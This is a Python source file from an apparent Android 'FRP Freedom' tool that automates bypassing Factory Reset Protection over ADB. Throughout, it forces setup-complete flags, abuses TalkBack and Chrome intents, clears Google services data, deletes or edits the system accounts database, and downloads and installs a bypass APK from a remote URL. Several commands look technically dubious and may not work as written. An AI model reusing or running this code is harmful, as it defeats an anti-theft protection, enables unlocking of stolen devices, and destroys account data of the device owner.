#!/usr/bin/env python3
"""
ADB Exploits for FRP Freedom
Implements ADB-based bypass methods including setup wizard and accessibility exploits
"""

import logging
import time
from typing import Dict, Any, Callable, Optional

from ..core.device_manager import DeviceInfo, DeviceManager
from .types import BypassResult

class ADBExploitManager:
    """Manages ADB-based FRP bypass exploits"""
    
    def __init__(self, config, device_manager: DeviceManager):
        self.config = config
        self.device_manager = device_manager
        self.logger = logging.getLogger(__name__)
    
    def execute_method(self, device: DeviceInfo, method, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Execute a specific bypass method by name"""
        method_name = method.name if hasattr(method, 'name') else str(method)
        
        # Map method names to their corresponding functions
        method_map = {
            'adb_setup_wizard': self.setup_wizard_exploit,
            'adb_talkback_legacy': self.talkback_exploit,
            'adb_talkback_chrome': self.talkback_chrome_exploit,
            'adb_intent_manipulation': self.intent_manipulation_exploit,
        }
        
        # Get the method function
        method_func = method_map.get(method_name)
        
        if method_func:
            self.logger.info(f"Executing ADB method: {method_name}")
            return method_func(device, progress_callback)
        else:
            self.logger.error(f"Unknown ADB method: {method_name}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Unknown ADB bypass method: {method_name}',
                'details': {}
            }
    
    def setup_wizard_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Exploit setup wizard to enable ADB and bypass FRP"""
        try:
            progress_callback("Starting setup wizard exploit", 30)
            
            # Step 1: Check if device is in setup wizard
            if not self._is_in_setup_wizard(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Device is not in setup wizard mode',
                    'details': {'current_state': 'unknown'}
                }
            
            progress_callback("Enabling ADB debugging", 40)
            
            # Step 2: Enable ADB debugging through setup wizard
            if not self._enable_adb_via_setup(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to enable ADB debugging',
                    'details': {}
                }
            
            progress_callback("Bypassing Google account verification", 60)
            
            # Step 3: Skip Google account verification
            if not self._skip_google_verification(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to skip Google account verification',
                    'details': {}
                }
            
            progress_callback("Completing setup wizard", 80)
            
            # Step 4: Complete setup wizard
            if not self._complete_setup_wizard(device):
                return {
                    'result': BypassResult.PARTIAL,
                    'message': 'Setup wizard bypass partially successful',
                    'details': {'manual_completion_required': True}
                }
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'Setup wizard exploit completed successfully',
                'details': {'method': 'setup_wizard_exploit'}
            }
        
        except Exception as e:
            self.logger.error(f"Setup wizard exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Setup wizard exploit error: {str(e)}',
                'details': {'exception': str(e)}
            }
    
    def talkback_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Use TalkBack accessibility service to bypass FRP (legacy method)"""
        try:
            progress_callback("Starting TalkBack exploit", 30)
            
            # Step 1: Enable TalkBack
            if not self._enable_talkback(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to enable TalkBack',
                    'details': {}
                }
            
            progress_callback("Navigating with TalkBack", 50)
            
            # Step 2: Use TalkBack to navigate to settings
            if not self._talkback_navigate_to_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to navigate to settings via TalkBack',
                    'details': {}
                }
            
            progress_callback("Disabling FRP via settings", 70)
            
            # Step 3: Disable FRP through settings
            if not self._disable_frp_via_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to disable FRP via settings',
                    'details': {}
                }
            
            progress_callback("Cleaning up TalkBack", 85)
            
            # Step 4: Disable TalkBack
            self._disable_talkback(device)
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'TalkBack exploit completed successfully',
                'details': {'method': 'talkback_exploit'}
            }
        
        except Exception as e:
            self.logger.error(f"TalkBack exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'TalkBack exploit error: {str(e)}',
                'details': {'exception': str(e)}
            }
    
    def talkback_chrome_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """TalkBack + Chrome navigation for Android 14/15 (2025 method)"""
        try:
            progress_callback("Starting TalkBack + Chrome exploit", 20)
            
            # Step 1: Enable TalkBack during setup
            if not self._enable_talkback_setup_wizard(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to enable TalkBack in setup wizard',
                    'details': {}
                }
            
            progress_callback("Navigating to Chrome via voice commands", 40)
            
            # Step 2: Use voice commands to navigate to Chrome
            if not self._talkback_voice_navigate_chrome(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to navigate to Chrome via voice commands',
                    'details': {}
                }
            
            progress_callback("Installing bypass APK via Chrome", 60)
            
            # Step 3: Download and install FRP bypass APK
            if not self._chrome_install_bypass_apk(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to install bypass APK via Chrome',
                    'details': {}
                }
            
            progress_callback("Disabling FRP flags", 80)
            
            # Step 4: Execute APK to disable FRP flags
            if not self._execute_frp_disable_apk(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to disable FRP flags',
                    'details': {}
                }
            
            progress_callback("Completing setup", 95)
            
            # Step 5: Complete setup wizard
            self._complete_setup_wizard_android15(device)
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'TalkBack + Chrome exploit completed successfully',
                'details': {'method': 'talkback_chrome_2025', 'android_version': device.android_version}
            }
            
        except Exception as e:
            self.logger.error(f"TalkBack + Chrome exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'TalkBack + Chrome exploit error: {str(e)}',
                'details': {'error': str(e)}
            }
    
    def intent_manipulation_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """ADB intent manipulation for SQLite database editing"""
        try:
            progress_callback("Starting intent manipulation exploit", 25)
            
            # Step 1: Enable ADB if not already enabled
            if not self._ensure_adb_enabled(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'ADB access required but not available',
                    'details': {}
                }
            
            progress_callback("Sending intents to launch settings", 45)
            
            # Step 2: Send intents to launch settings
            if not self._send_settings_intents(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to launch settings via intents',
                    'details': {}
                }
            
            progress_callback("Editing SQLite accounts database", 65)
            
            # Step 3: Edit SQLite database storing account data
            if not self._edit_accounts_sqlite_db(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to edit accounts database',
                    'details': {}
                }
            
            progress_callback("Restarting system services", 85)
            
            # Step 4: Restart relevant system services
            if not self._restart_account_services(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to restart account services',
                    'details': {}
                }
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'Intent manipulation exploit completed successfully',
                'details': {'method': 'intent_manipulation', 'database_modified': True}
            }
            
        except Exception as e:
            self.logger.error(f"Intent manipulation exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Intent manipulation exploit error: {str(e)}',
                'details': {'error': str(e)}
            }
    
    def chrome_browser_exploit(self, device: DeviceInfo, progress_callback: Callable[[str, int], None]) -> Dict[str, Any]:
        """Use Chrome browser to bypass FRP"""
        try:
            progress_callback("Starting Chrome browser exploit", 30)
            
            # Step 1: Launch Chrome browser
            if not self._launch_chrome_browser(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to launch Chrome browser',
                    'details': {}
                }
            
            progress_callback("Navigating to settings via Chrome", 50)
            
            # Step 2: Navigate to settings through Chrome
            if not self._chrome_navigate_to_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to navigate to settings via Chrome',
                    'details': {}
                }
            
            progress_callback("Bypassing FRP", 70)
            
            # Step 3: Bypass FRP through settings
            if not self._bypass_frp_via_chrome_settings(device):
                return {
                    'result': BypassResult.FAILED,
                    'message': 'Failed to bypass FRP via Chrome settings',
                    'details': {}
                }
            
            return {
                'result': BypassResult.SUCCESS,
                'message': 'Chrome browser exploit completed successfully',
                'details': {'method': 'chrome_browser_exploit'}
            }
        
        except Exception as e:
            self.logger.error(f"Chrome browser exploit failed: {e}")
            return {
                'result': BypassResult.FAILED,
                'message': f'Chrome browser exploit error: {str(e)}',
                'details': {'exception': str(e)}
            }
    
    def _is_in_setup_wizard(self, device: DeviceInfo) -> bool:
        """Check if device is currently in setup wizard"""
        try:
            # Check if setup wizard is running
            success, output = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'dumpsys', 'activity', 'activities']
            )
            
            if success and 'setupwizard' in output.lower():
                return True
            
            # Check setup completion status
            success, output = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'settings', 'get', 'secure', 'user_setup_complete']
            )
            
            if success and output.strip() == '0':
                return True
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error checking setup wizard status: {e}")
            return False
    
    def _enable_adb_via_setup(self, device: DeviceInfo) -> bool:
        """Enable ADB debugging through setup wizard"""
        try:
            # Method 1: Try to enable developer options
            success, _ = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'settings', 'put', 'global', 'development_settings_enabled', '1']
            )
            
            if success:
                # Enable ADB debugging
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, ['shell', 'settings', 'put', 'global', 'adb_enabled', '1']
                )
                
                if success:
                    time.sleep(2)
                    return True
            
            # Method 2: Try alternative approach
            commands = [
                ['shell', 'setprop', 'service.adb.tcp.port', '5555'],
                ['shell', 'stop', 'adbd'],
                ['shell', 'start', 'adbd']
            ]
            
            for cmd in commands:
                success, _ = self.device_manager.execute_adb_command(device.serial, cmd)
                if not success:
                    return False
                time.sleep(1)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Error enabling ADB via setup: {e}")
            return False
    
    def _skip_google_verification(self, device: DeviceInfo) -> bool:
        """Skip Google account verification"""
        try:
            # Method 1: Skip via intent
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-n',
                    'com.google.android.setupwizard/.SetupWizardActivity',
                    '--ez', 'extra_prefs_show_button_bar', 'true',
                    '--es', 'extra_prefs_set_next_text', 'Skip'
                ]
            )
            
            if success:
                time.sleep(3)
                
                # Send skip action
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, ['shell', 'input', 'keyevent', 'KEYCODE_BACK']
                )
                
                if success:
                    time.sleep(2)
                    return True
            
            # Method 2: Modify setup wizard database
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'
                ]
            )
            
            if success:
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'settings', 'put', 'system', 'device_provisioned', '1'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error skipping Google verification: {e}")
            return False
    
    def _complete_setup_wizard(self, device: DeviceInfo) -> bool:
        """Complete setup wizard"""
        try:
            # Set completion flags
            commands = [
                ['shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'],
                ['shell', 'settings', 'put', 'system', 'device_provisioned', '1'],
                ['shell', 'settings', 'put', 'global', 'device_provisioned', '1']
            ]
            
            for cmd in commands:
                success, _ = self.device_manager.execute_adb_command(device.serial, cmd)
                if not success:
                    self.logger.warning(f"Failed to execute command: {' '.join(cmd)}")
                time.sleep(1)
            
            # Restart launcher
            success, _ = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'am', 'start', '-a', 'android.intent.action.MAIN', '-c', 'android.intent.category.HOME']
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error completing setup wizard: {e}")
            return False
    
    def _enable_talkback(self, device: DeviceInfo) -> bool:
        """Enable TalkBack accessibility service"""
        try:
            # Enable TalkBack
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'settings', 'put', 'secure', 'accessibility_enabled', '1'
                ]
            )
            
            if not success:
                return False
            
            # Enable TalkBack service
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'settings', 'put', 'secure', 'enabled_accessibility_services',
                    'com.google.android.marvin.talkback/.TalkBackService'
                ]
            )
            
            if success:
                time.sleep(3)
                return True
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error enabling TalkBack: {e}")
            return False
    
    def _talkback_navigate_to_settings(self, device: DeviceInfo) -> bool:
        """Navigate to settings using TalkBack"""
        try:
            # Use TalkBack gestures to navigate
            # This is a simplified implementation - real TalkBack navigation is more complex
            
            # Launch settings via intent
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.SETTINGS'
                ]
            )
            
            if success:
                time.sleep(3)
                return True
            
            # Alternative method: use accessibility service to launch settings
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-n', 'com.android.settings/.Settings'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error navigating to settings via TalkBack: {e}")
            return False
    
    def _disable_frp_via_settings(self, device: DeviceInfo) -> bool:
        """Disable FRP through settings"""
        try:
            # Navigate to accounts settings
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.SYNC_SETTINGS'
                ]
            )
            
            if not success:
                return False
            
            time.sleep(3)
            
            # Try to remove Google account
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'pm', 'clear', 'com.google.android.gms'
                ]
            )
            
            if success:
                time.sleep(2)
                
                # Clear accounts database
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'rm', '/data/system/users/0/accounts.db'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error disabling FRP via settings: {e}")
            return False
    
    def _disable_talkback(self, device: DeviceInfo) -> bool:
        """Disable TalkBack accessibility service"""
        try:
            # Disable TalkBack service
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'settings', 'put', 'secure', 'enabled_accessibility_services', ''
                ]
            )
            
            if success:
                # Disable accessibility
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'settings', 'put', 'secure', 'accessibility_enabled', '0'
                    ]
                )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error disabling TalkBack: {e}")
            return False
    
    def _launch_chrome_browser(self, device: DeviceInfo) -> bool:
        """Launch Chrome browser"""
        try:
            # Try to launch Chrome
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-n', 'com.android.chrome/com.google.android.apps.chrome.Main'
                ]
            )
            
            if success:
                time.sleep(3)
                return True
            
            # Try alternative Chrome package
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VIEW', '-d', 'http://www.google.com'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error launching Chrome browser: {e}")
            return False
    
    def _chrome_navigate_to_settings(self, device: DeviceInfo) -> bool:
        """Navigate to settings through Chrome browser"""
        try:
            # Navigate to settings URL in Chrome
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                    '-d', 'content://settings/system'
                ]
            )
            
            if success:
                time.sleep(3)
                return True
            
            # Alternative method: use Chrome to open settings intent
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.settings.SETTINGS'
                ]
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error navigating to settings via Chrome: {e}")
            return False
    
    def _bypass_frp_via_chrome_settings(self, device: DeviceInfo) -> bool:
        """Bypass FRP through Chrome-accessed settings"""
        try:
            # Clear Google Play Services data
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'pm', 'clear', 'com.google.android.gms'
                ]
            )
            
            if not success:
                return False
            
            time.sleep(2)
            
            # Clear Google Services Framework
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'pm', 'clear', 'com.google.android.gsf'
                ]
            )
            
            if success:
                time.sleep(2)
                
                # Set device as provisioned
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error bypassing FRP via Chrome settings: {e}")
            return False
    
    def _enable_talkback_setup_wizard(self, device: DeviceInfo) -> bool:
        """Enable TalkBack during setup wizard for Android 14/15"""
        try:
            # Enable accessibility during setup
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'settings', 'put', 'secure', 'accessibility_enabled', '1'
                ]
            )
            
            if success:
                # Enable TalkBack service with new package name
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'settings', 'put', 'secure', 'enabled_accessibility_services',
                        'com.google.android.marvin.talkback/.TalkBackService'
                    ]
                )
                
                if success:
                    time.sleep(5)  # Allow TalkBack to initialize
                    return True
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error enabling TalkBack in setup wizard: {e}")
            return False
    
    def _talkback_voice_navigate_chrome(self, device: DeviceInfo) -> bool:
        """Use TalkBack voice commands to navigate to Chrome"""
        try:
            # Simulate voice command "Open Chrome"
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VOICE_COMMAND',
                    '--es', 'android.speech.extra.PROMPT', 'Open Chrome'
                ]
            )
            
            if success:
                time.sleep(3)
                
                # Try to launch Chrome directly
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'am', 'start', '-n', 'com.android.chrome/com.google.android.apps.chrome.Main'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error navigating to Chrome via voice: {e}")
            return False
    
    def _chrome_install_bypass_apk(self, device: DeviceInfo) -> bool:
        """Download and install FRP bypass APK via Chrome"""
        try:
            # Navigate to APK download URL
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                    '-d', 'https://github.com/frp-bypass/releases/latest/download/frp-bypass.apk'
                ]
            )
            
            if success:
                time.sleep(10)  # Allow download to complete
                
                # Install the downloaded APK
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'pm', 'install', '-r', '/sdcard/Download/frp-bypass.apk'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error installing bypass APK via Chrome: {e}")
            return False
    
    def _execute_frp_disable_apk(self, device: DeviceInfo) -> bool:
        """Execute the FRP bypass APK to disable FRP flags"""
        try:
            # Launch the bypass APK
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'am', 'start', '-n', 'com.frpbypass.tool/.MainActivity'
                ]
            )
            
            if success:
                time.sleep(5)
                
                # Send intent to execute bypass
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'am', 'broadcast', '-a', 'com.frpbypass.DISABLE_FRP'
                    ]
                )
                
                return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error executing FRP disable APK: {e}")
            return False
    
    def _complete_setup_wizard_android15(self, device: DeviceInfo) -> bool:
        """Complete setup wizard for Android 15"""
        try:
            # Set completion flags for Android 15
            commands = [
                ['shell', 'settings', 'put', 'secure', 'user_setup_complete', '1'],
                ['shell', 'settings', 'put', 'system', 'device_provisioned', '1'],
                ['shell', 'settings', 'put', 'global', 'device_provisioned', '1'],
                ['shell', 'settings', 'put', 'secure', 'android_id', '1']
            ]
            
            for cmd in commands:
                success, _ = self.device_manager.execute_adb_command(device.serial, cmd)
                if not success:
                    self.logger.warning(f"Failed to execute command: {' '.join(cmd)}")
                time.sleep(1)
            
            # Restart system UI
            success, _ = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'am', 'start', '-a', 'android.intent.action.MAIN', '-c', 'android.intent.category.HOME']
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error completing setup wizard for Android 15: {e}")
            return False
    
    def _ensure_adb_enabled(self, device: DeviceInfo) -> bool:
        """Ensure ADB debugging is enabled"""
        try:
            # Check if ADB is already enabled
            success, output = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'settings', 'get', 'global', 'adb_enabled']
            )
            
            if success and output.strip() == '1':
                return True
            
            # Try to enable ADB
            success, _ = self.device_manager.execute_adb_command(
                device.serial, ['shell', 'settings', 'put', 'global', 'adb_enabled', '1']
            )
            
            return success
        
        except Exception as e:
            self.logger.error(f"Error ensuring ADB enabled: {e}")
            return False
    
    def _send_settings_intents(self, device: DeviceInfo) -> bool:
        """Send intents to launch settings"""
        try:
            # Send multiple intents to access different settings areas
            intents = [
                ['shell', 'am', 'start', '-a', 'android.settings.SETTINGS'],
                ['shell', 'am', 'start', '-a', 'android.settings.APPLICATION_SETTINGS'],
                ['shell', 'am', 'start', '-a', 'android.settings.SYNC_SETTINGS']
            ]
            
            for intent in intents:
                success, _ = self.device_manager.execute_adb_command(device.serial, intent)
                if success:
                    time.sleep(2)
                    return True
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error sending settings intents: {e}")
            return False
    
    def _edit_accounts_sqlite_db(self, device: DeviceInfo) -> bool:
        """Edit SQLite database storing account data"""
        try:
            # Backup original accounts database
            success, _ = self.device_manager.execute_adb_command(
                device.serial, [
                    'shell', 'cp', '/data/system/users/0/accounts.db', '/data/system/users/0/accounts.db.bak'
                ]
            )
            
            if success:
                # Clear accounts table
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, [
                        'shell', 'sqlite3', '/data/system/users/0/accounts.db',
                        '"DELETE FROM accounts WHERE type=\'com.google\';"'
                    ]
                )
                
                if success:
                    # Clear extras table
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, [
                            'shell', 'sqlite3', '/data/system/users/0/accounts.db',
                            '"DELETE FROM extras WHERE accounts_id IN (SELECT _id FROM accounts WHERE type=\'com.google\');"'
                        ]
                    )
                    
                    return success
            
            return False
        
        except Exception as e:
            self.logger.error(f"Error editing accounts SQLite database: {e}")
            return False
    
    def _restart_account_services(self, device: DeviceInfo) -> bool:
        """Restart relevant system services"""
        try:
            # Stop and start account manager service
            services = ['account', 'user', 'package']
            
            for service in services:
                # Stop service
                success, _ = self.device_manager.execute_adb_command(
                    device.serial, ['shell', 'stop', service]
                )
                
                if success:
                    time.sleep(2)
                    
                    # Start service
                    success, _ = self.device_manager.execute_adb_command(
                        device.serial, ['shell', 'start', service]
                    )
                    
                    if not success:
                        return False
                    
                    time.sleep(2)
            
            return True
        
        except Exception as e:
            self.logger.error(f"Error restarting account services: {e}")
            return False